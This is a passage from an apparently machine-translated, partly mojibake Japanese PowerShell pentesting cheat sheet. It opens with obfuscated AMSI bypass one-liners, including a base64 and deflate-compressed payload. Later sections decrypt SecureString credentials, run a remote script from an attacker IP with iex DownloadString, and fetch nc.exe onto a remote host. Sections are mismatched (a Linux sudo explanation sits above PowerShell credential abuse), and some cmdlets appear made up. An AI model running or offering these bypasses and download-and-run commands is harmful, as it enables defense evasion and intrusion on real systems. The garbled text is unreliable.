[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
&( $SHELLid[1]+$SHELlId[13]+'X') (NeW-OBJEct sYStEm.iO.coMPrESSIOn.defLAtEstReam( [iO.meMorYStReAm] [cOnvErt]::froMBaSE64StRINg( 'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'), [sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]::decOMPRESs ) | foreAch{NeW-OBJEct iO.STREaMREadER( $_ , [teXt.ENCoDiNg]::aScii )}).REadtoenD( )

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
${1}.SetValue($null,$true)

# Another Method
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)

# AMSI Bypass in python
https://fluidattacks.com/blog/amsi-bypass-python/

# Testing for Amsi Bypass:
https://github.com/rasta-mouse/AmsiScanBufferBypass

# Amsi-Bypass-Powershell
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

https://blog.f-secure.com/hunting-for-amsi-bypasses/
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
https://slaeryan.github.io/posts/falcon-zero-alpha.html
```
### AMSIãƒã‚¤ãƒ‘ã‚¹2 - ãƒãƒãƒ¼ã‚¸ãƒ‰APIå‘¼ã³å‡ºã—ãƒ•ãƒƒã‚¯

è©³ç´°ãªæƒ…å ±ã«ã¤ã„ã¦ã¯ã€[**ã“ã®æŠ•ç¨¿ã‚’å‚ç…§ã—ã¦ãã ã•ã„**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)ã€‚\*\*\*\*[ **ãŠã‚ˆã³ã‚³ãƒ¼ãƒ‰**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)ã€‚

ã“ã®æ–°ã—ã„æŠ€è¡“ã¯ã€.NETãƒ¡ã‚½ãƒƒãƒ‰ã®APIå‘¼ã³å‡ºã—ãƒ•ãƒƒã‚¯ã«ä¾å­˜ã—ã¦ã„ã¾ã™ã€‚å®Ÿéš›ã«ã¯ã€.NETãƒ¡ã‚½ãƒƒãƒ‰ã¯ãƒ¡ãƒ¢ãƒªå†…ã§ãƒã‚¤ãƒ†ã‚£ãƒ–ãªãƒã‚·ãƒ³å‘½ä»¤ã«ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã€ãƒã‚¤ãƒ†ã‚£ãƒ–ãªãƒ¡ã‚½ãƒƒãƒ‰ã¨éå¸¸ã«ä¼¼ãŸå½¢ã«ãªã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸãƒ¡ã‚½ãƒƒãƒ‰ã¯ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®åˆ¶å¾¡ãƒ•ãƒ­ãƒ¼ã‚’å¤‰æ›´ã™ã‚‹ãŸã‚ã«ãƒ•ãƒƒã‚¯ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

.NETãƒ¡ã‚½ãƒƒãƒ‰ã®APIå‘¼ã³å‡ºã—ãƒ•ãƒƒã‚¯ã‚’å®Ÿè¡Œã™ã‚‹æ‰‹é †ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

1. ãƒ•ãƒƒã‚¯ã™ã‚‹å¯¾è±¡ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ç‰¹å®šã™ã‚‹
2. ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã¨åŒã˜é–¢æ•°ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã‚’æŒã¤ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å®šç¾©ã™ã‚‹
3. ãƒ¡ã‚½ãƒƒãƒ‰ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ãƒªãƒ•ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹
4. å„ãƒ¡ã‚½ãƒƒãƒ‰ãŒã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹
5. å„ãƒ¡ã‚½ãƒƒãƒ‰ã®ãƒ¡ãƒ¢ãƒªä¸Šã®ä½ç½®ã‚’è¦‹ã¤ã‘ã‚‹
6. æ‚ªæ„ã®ã‚ã‚‹ãƒ¡ã‚½ãƒƒãƒ‰ã‚’æŒ‡ã™å‘½ä»¤ã«å¯¾è±¡ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä¸Šæ›¸ãã™ã‚‹

## PS-History
```powershell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
## æ¨©é™ã®å–å¾—

To gather information about the permissions assigned to a user or a group in a Windows system, you can use the `Get-Acl` cmdlet in PowerShell. This cmdlet retrieves the access control list (ACL) for a specified resource, such as a file or a directory.

```powershell
Get-Acl -Path C:\path\to\file.txt
```

This command will display the permissions assigned to the file.txt file, including the user or group name, the type of permission (e.g., Read, Write, Execute), and whether the permission is inherited from a parent object.

You can also use the `Get-Acl` cmdlet to retrieve the permissions for a registry key or a directory:

```powershell
Get-Acl -Path HKLM:\SOFTWARE\Microsoft
Get-Acl -Path C:\path\to\directory
```

By examining the permissions assigned to various resources, you can identify potential security vulnerabilities and determine if any unauthorized access has been granted.
```powershell
Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```
## OSã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¨HotFixes

ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€PowerShellã‚’ä½¿ç”¨ã—ã¦Windowsã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¨é©ç”¨ã•ã‚ŒãŸHotFixesï¼ˆä¿®æ­£ãƒ—ãƒ­ã‚°ãƒ©ãƒ ï¼‰ã‚’å–å¾—ã™ã‚‹ãŸã‚ã®ã‚‚ã®ã§ã™ã€‚

### ä½¿ç”¨æ³•

1. ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹å‰ã«ã€PowerShellã‚’ç®¡ç†è€…ã¨ã—ã¦å®Ÿè¡Œã—ã¦ãã ã•ã„ã€‚

2. ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€Windowsã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¨é©ç”¨ã•ã‚ŒãŸHotFixesãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

### ã‚¹ã‚¯ãƒªãƒ—ãƒˆ

```powershell
# OSãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å–å¾—
$osVersion = Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Caption

# HotFixesã‚’å–å¾—
$hotFixes = Get-HotFix | Select-Object -Property HotFixID, InstalledOn

# çµæœã‚’è¡¨ç¤º
Write-Host "OSãƒãƒ¼ã‚¸ãƒ§ãƒ³: $osVersion"
Write-Host "HotFixes:"
$hotFixes | Format-Table -AutoSize
```

### å‡ºåŠ›ä¾‹

```
OSãƒãƒ¼ã‚¸ãƒ§ãƒ³: Microsoft Windows 10 Pro
HotFixes:

HotFixID   InstalledOn
--------   -----------
KB123456   2020/01/01
KB789012   2020/02/15
```

ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€Windowsã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¨é©ç”¨ã•ã‚ŒãŸHotFixesã‚’ç°¡å˜ã«å–å¾—ã§ãã¾ã™ã€‚
```powershell
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
## ç’°å¢ƒ

The following instructions assume that you have a Windows machine with PowerShell installed. If you don't have PowerShell installed, you can download it from the official Microsoft website.

ä»¥ä¸‹ã®æ‰‹é †ã¯ã€PowerShellãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸWindowsãƒã‚·ãƒ³ã‚’æƒ³å®šã—ã¦ã„ã¾ã™ã€‚PowerShellãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ãªã„å ´åˆã¯ã€å…¬å¼ã®Microsoftã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‹ã‚‰ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## Basic PowerShell Commands

PowerShell is a powerful scripting language and command-line shell that is built on the .NET Framework. It provides a wide range of commands and features that can be used for various purposes, including system administration, automation, and penetration testing.

Here are some basic PowerShell commands that can be useful for pentesters:

### Get-Process

The `Get-Process` command is used to retrieve information about the processes running on a system. It can be used to identify running processes, their process IDs (PIDs), memory usage, and other details.

```powershell
Get-Process
```

### Get-Service

The `Get-Service` command is used to retrieve information about the services running on a system. It can be used to identify running services, their status, and other details.

```powershell
Get-Service
```

### Get-NetAdapter

The `Get-NetAdapter` command is used to retrieve information about the network adapters installed on a system. It can be used to identify network interfaces, their IP addresses, MAC addresses, and other details.

```powershell
Get-NetAdapter
```

### Get-NetFirewallRule

The `Get-NetFirewallRule` command is used to retrieve information about the firewall rules configured on a system. It can be used to identify firewall rules, their status, and other details.

```powershell
Get-NetFirewallRule
```

### Get-EventLog

The `Get-EventLog` command is used to retrieve information from the event logs on a system. It can be used to identify logged events, their timestamps, event IDs, and other details.

```powershell
Get-EventLog -LogName System
```

These are just a few examples of the basic PowerShell commands that can be used for pentesting. PowerShell provides many more commands and features that can be explored and utilized for various purposes.
```powershell
Get-ChildItem Env: | ft Key,Value #get all values
$env:UserName @Get UserName value
```
## ä»–ã®æ¥ç¶šã•ã‚ŒãŸãƒ‰ãƒ©ã‚¤ãƒ–

When conducting a penetration test on a Windows system, it is important to gather as much information as possible about the target. One area that is often overlooked is the presence of other connected drives.

In Windows, a connected drive refers to any additional storage device that is connected to the system, such as USB drives, external hard drives, or network drives. These drives may contain valuable information that can be useful during a penetration test.

To identify other connected drives, we can use PowerShell. PowerShell is a powerful scripting language that is built into Windows and provides a wide range of functionalities for system administration and automation.

To list all the connected drives on a Windows system, we can use the following PowerShell command:

```powershell
Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, VolumeName, FileSystem, Size, FreeSpace
```

This command uses the `Get-WmiObject` cmdlet to retrieve information about logical disks on the system. The `Select-Object` cmdlet is then used to select specific properties, such as the device ID, volume name, file system, size, and free space.

By running this command, we can obtain a list of all the connected drives along with their respective properties. This information can be helpful in identifying potential targets for further investigation or exploitation.

It is worth noting that some connected drives may require elevated privileges to access. In such cases, it may be necessary to escalate privileges or obtain the necessary credentials to access the drive.

In conclusion, when conducting a penetration test on a Windows system, it is important to gather information about other connected drives. PowerShell provides a convenient way to retrieve this information and can be a valuable tool in the penetration tester's arsenal.
```powershell
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
### ãƒªã‚µã‚¤ã‚¯ãƒ« ãƒ“ãƒ³

The Recycle Bin is a feature in Windows that allows users to temporarily store deleted files and folders. When a file or folder is deleted, it is moved to the Recycle Bin instead of being permanently deleted from the system. This provides a safety net for users in case they accidentally delete something and need to restore it.

To access the Recycle Bin, simply double-click on its icon on the desktop. This will open a window displaying all the files and folders that have been deleted. From here, you can select the items you want to restore and click on the "Restore" button to move them back to their original location.

It's important to note that the Recycle Bin has a limited storage capacity. Once it reaches its maximum size, older items will be automatically deleted to make room for new ones. You can adjust the size of the Recycle Bin by right-clicking on its icon, selecting "Properties," and then adjusting the slider under the "Maximum size" section.

In addition to restoring deleted files, the Recycle Bin also allows you to permanently delete items. To do this, simply select the files or folders you want to delete and click on the "Delete" button. This will bypass the Recycle Bin and permanently remove the selected items from the system.

Overall, the Recycle Bin is a useful feature in Windows that helps protect against accidental file deletions. It provides a convenient way to restore deleted items and also allows for permanent deletion when needed.
```powershell
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
```
[https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/](https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/)

## ãƒ‰ãƒ¡ã‚¤ãƒ³ã®åµå¯Ÿ

{% content-ref url="powerview.md" %}
[powerview.md](powerview.md)
{% endcontent-ref %}

## ãƒ¦ãƒ¼ã‚¶ãƒ¼
```powershell
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
```
## ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‹ã‚‰å¹³æ–‡ã¸

In some cases, during a penetration test, you may come across a secure string that needs to be converted to plaintext for further analysis. PowerShell provides a way to convert secure strings to plaintext using the `ConvertFrom-SecureString` cmdlet.

ä»¥ä¸‹ã®å ´åˆã€ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆä¸­ã«ã€ã•ã‚‰ãªã‚‹åˆ†æã®ãŸã‚ã«ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‚’å¹³æ–‡ã«å¤‰æ›ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚PowerShellã¯ã€`ConvertFrom-SecureString`ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ã€ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‚’å¹³æ–‡ã«å¤‰æ›ã™ã‚‹æ–¹æ³•ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚

To convert a secure string to plaintext, follow these steps:

ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‚’å¹³æ–‡ã«å¤‰æ›ã™ã‚‹ã«ã¯ã€ä»¥ä¸‹ã®æ‰‹é †ã«å¾“ã£ã¦ãã ã•ã„ã€‚

1. Open a PowerShell session.

1. PowerShellã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’é–‹ãã¾ã™ã€‚

2. Use the `ConvertFrom-SecureString` cmdlet followed by the secure string you want to convert. For example:

2. å¤‰æ›ã—ãŸã„ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã®å¾Œã«`ConvertFrom-SecureString`ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ä¾‹ãˆã°ï¼š

```powershell
$secureString = ConvertTo-SecureString -String "MySecurePassword" -AsPlainText -Force
$plainText = ConvertFrom-SecureString -SecureString $secureString
```

3. The secure string will be converted to plaintext and stored in the `$plainText` variable.

3. ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã¯å¹³æ–‡ã«å¤‰æ›ã•ã‚Œã€`$plainText`å¤‰æ•°ã«æ ¼ç´ã•ã‚Œã¾ã™ã€‚

Keep in mind that converting a secure string to plaintext should only be done for legitimate purposes and with proper authorization.
```powershell
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
$user = "HTB\Tom"
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
ã¾ãŸã¯ã€XMLã‹ã‚‰ç›´æ¥è§£æã™ã‚‹å ´åˆ:
```powershell
$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
## SUDO

SUDOã¯ã€Linuxã‚·ã‚¹ãƒ†ãƒ ã§ç‰¹æ¨©ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚é€šå¸¸ã€rootãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ¨©é™ã‚’æŒãŸãªã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã€ä¸€æ™‚çš„ã«rootæ¨©é™ã‚’å–å¾—ã—ã¦å¿…è¦ãªæ“ä½œã‚’è¡Œã†ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

SUDOã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯è‡ªåˆ†ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã—ã¦ç‰¹æ¨©ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯å¿…è¦ãªæ“ä½œã‚’è¡Œã†ãŸã‚ã«rootæ¨©é™ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€å¸¸ã«rootæ¨©é™ã‚’æŒã¤ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚

SUDOã®è¨­å®šã¯ã€`/etc/sudoers`ãƒ•ã‚¡ã‚¤ãƒ«ã§è¡Œã‚ã‚Œã¾ã™ã€‚ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯ã€ã©ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã©ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹ã‹ã®è¨­å®šãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ã¾ãŸã€`visudo`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€`/etc/sudoers`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç·¨é›†ã™ã‚‹ã“ã¨ãŒæ¨å¥¨ã•ã‚Œã¦ã„ã¾ã™ã€‚

SUDOã®è¨­å®šã«ã¯ã„ãã¤ã‹ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã›ãšã«SUDOã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚ã¾ãŸã€ç‰¹å®šã®ã‚³ãƒãƒ³ãƒ‰ã®ã¿ã‚’å®Ÿè¡Œã§ãã‚‹ã‚ˆã†ã«åˆ¶é™ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

SUDOã‚’ä½¿ç”¨ã™ã‚‹éš›ã«ã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®æ³¨æ„ãŒå¿…è¦ã§ã™ã€‚ä¸é©åˆ‡ãªè¨­å®šã‚„æ‚ªæ„ã®ã‚ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã‚‹æ‚ªç”¨ãŒè¡Œã‚ã‚Œã‚‹ã¨ã€ã‚·ã‚¹ãƒ†ãƒ ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãŒè„…ã‹ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãã®ãŸã‚ã€SUDOã®è¨­å®šã¯æ…é‡ã«è¡Œã†å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

SUDOã¯ã€Linuxã‚·ã‚¹ãƒ†ãƒ ã§ã®ç‰¹æ¨©ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ“ä½œã‚’åˆ¶å¾¡ã™ã‚‹ãŸã‚ã®å¼·åŠ›ãªãƒ„ãƒ¼ãƒ«ã§ã™ã€‚æ­£ã—ãè¨­å®šã•ã‚ŒãŸSUDOã¯ã€ã‚·ã‚¹ãƒ†ãƒ ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å‘ä¸Šã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```powershell
#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

#For local:
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"

#For WINRM
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred

Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'

#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
```
## ã‚°ãƒ«ãƒ¼ãƒ—

ã‚°ãƒ«ãƒ¼ãƒ—ã¯ã€Windowsã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã§ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ã‚’ç®¡ç†ã™ã‚‹ãŸã‚ã®é‡è¦ãªè¦ç´ ã§ã™ã€‚ã‚°ãƒ«ãƒ¼ãƒ—ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è«–ç†çš„ãªå˜ä½ã«ã¾ã¨ã‚ã€å…±é€šã®ã‚¢ã‚¯ã‚»ã‚¹è¨±å¯ã‚’å‰²ã‚Šå½“ã¦ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚Powershellã‚’ä½¿ç”¨ã—ã¦ã‚°ãƒ«ãƒ¼ãƒ—ã‚’ç®¡ç†ã™ã‚‹ã“ã¨ã¯ã€ãƒšãƒ³ãƒ†ã‚¹ã‚¿ãƒ¼ã«ã¨ã£ã¦éå¸¸ã«ä¾¿åˆ©ã§ã™ã€‚

### ã‚°ãƒ«ãƒ¼ãƒ—ã®ä½œæˆ

æ–°ã—ã„ã‚°ãƒ«ãƒ¼ãƒ—ã‚’ä½œæˆã™ã‚‹ã«ã¯ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
New-LocalGroup -Name <GroupName>
```

### ã‚°ãƒ«ãƒ¼ãƒ—ã®å‰Šé™¤

æ—¢å­˜ã®ã‚°ãƒ«ãƒ¼ãƒ—ã‚’å‰Šé™¤ã™ã‚‹ã«ã¯ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Remove-LocalGroup -Name <GroupName>
```

### ã‚°ãƒ«ãƒ¼ãƒ—ã¸ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®è¿½åŠ 

æ—¢å­˜ã®ã‚°ãƒ«ãƒ¼ãƒ—ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è¿½åŠ ã™ã‚‹ã«ã¯ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Add-LocalGroupMember -Group <GroupName> -Member <UserName>
```

### ã‚°ãƒ«ãƒ¼ãƒ—ã‹ã‚‰ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å‰Šé™¤

æ—¢å­˜ã®ã‚°ãƒ«ãƒ¼ãƒ—ã‹ã‚‰ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å‰Šé™¤ã™ã‚‹ã«ã¯ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Remove-LocalGroupMember -Group <GroupName> -Member <UserName>
```

### ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã®è¡¨ç¤º

ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã‚’è¡¨ç¤ºã™ã‚‹ã«ã¯ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Get-LocalGroupMember -Group <GroupName>
```

### ã‚°ãƒ«ãƒ¼ãƒ—ã®ã‚¢ã‚¯ã‚»ã‚¹è¨±å¯ã®è¡¨ç¤º

ã‚°ãƒ«ãƒ¼ãƒ—ã®ã‚¢ã‚¯ã‚»ã‚¹è¨±å¯ã‚’è¡¨ç¤ºã™ã‚‹ã«ã¯ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Get-LocalGroup -Name <GroupName> | Get-LocalGroupPermission
```

### ã‚°ãƒ«ãƒ¼ãƒ—ã®ã‚¢ã‚¯ã‚»ã‚¹è¨±å¯ã®å¤‰æ›´

ã‚°ãƒ«ãƒ¼ãƒ—ã®ã‚¢ã‚¯ã‚»ã‚¹è¨±å¯ã‚’å¤‰æ›´ã™ã‚‹ã«ã¯ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Set-LocalGroupPermission -Group <GroupName> -Permission <Permission>
```

